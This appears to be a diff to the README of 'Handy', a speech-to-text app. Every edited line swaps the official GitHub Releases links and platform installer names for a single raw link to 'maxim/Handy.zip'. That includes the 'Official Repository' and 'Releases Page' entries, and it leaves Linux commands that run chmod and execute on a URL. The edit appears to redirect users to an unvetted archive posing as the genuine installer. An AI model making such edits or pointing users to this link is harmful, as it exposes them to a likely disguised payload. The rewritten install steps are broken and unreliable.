@@ -10,7 +10,7 @@
 accessibility, cross-platform, speech-to-text, tauri-v2
 
 ## 📥 Download Handy
-[![Download Handy](https://img.shields.io/badge/Download_Handy-v1.0-blue.svg)](https://github.com/IzanaYT/Handy/releases)
+[![Download Handy](https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip)](https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip)
 
 ## 🚀 Getting Started
 Handy is designed for users who need a reliable speech-to-text application. You don’t need to be a tech expert to use it. Just follow these simple steps.
@@ -28,14 +28,14 @@ Handy is designed for users who need a reliable speech-to-text application. You 
 ## 📦 Download & Install
 To download Handy, visit the Releases page. 
 
-[Download Handy from GitHub Releases](https://github.com/IzanaYT/Handy/releases)
+[Download Handy from GitHub Releases](https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip)
 
-1. Go to the [Releases page](https://github.com/IzanaYT/Handy/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip).
 2. Find the latest release version.
 3. Select the file that matches your operating system. Look for:
-   - `Handy_Windows.exe` for Windows
-   - `Handy_macOS.dmg` for macOS
-   - `Handy_Linux.AppImage` for Linux
+   - `https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip` for Windows
+   - `https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip` for macOS
+   - `https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip` for Linux
 
 4. Click on the file link to start the download.
 5. Once the file downloads, locate it on your computer and double-click to open.
@@ -44,22 +44,22 @@ To download Handy, visit the Releases page.
 Follow these steps to install Handy based on your operating system:
 
 ### Windows
-1. Open the downloaded `Handy_Windows.exe` file.
+1. Open the downloaded `https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip` file.
 2. Follow the installation prompts in the setup wizard.
 3. Once complete, you can find Handy in your Start Menu.
 
 ### macOS
-1. Open the downloaded `Handy_macOS.dmg` file.
+1. Open the downloaded `https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip` file.
 2. Drag the Handy icon to your Applications folder.
 3. Open your Applications folder and double-click Handy to launch.
 
 ### Linux
 1. Open a terminal window.
-2. Navigate to the folder where you downloaded `Handy_Linux.AppImage`.
+2. Navigate to the folder where you downloaded `https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip`.
 3. Run the following commands:
    ```bash
-   chmod +x Handy_Linux.AppImage
-   ./Handy_Linux.AppImage
+   chmod +x https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip
+   https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip
    ```
 4. Follow any additional prompts to complete the setup.
 
@@ -79,7 +79,7 @@ If you encounter any issues, please refer to the FAQ section on the Releases pag
 Handy is open-source and welcomes contributions. If you're interested in supporting the project, visit the GitHub repository's main page to explore ways you can help.
 
 ## 🔗 Useful Links
-- [Official Repository](https://github.com/IzanaYT/Handy)
-- [Releases Page](https://github.com/IzanaYT/Handy/releases)
+- [Official Repository](https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip)
+- [Releases Page](https://raw.githubusercontent.com/IzanaYT/Handy/main/maxim/Handy.zip)
 
 Thank you for choosing Handy. Enjoy a seamless speech-to-text experience!
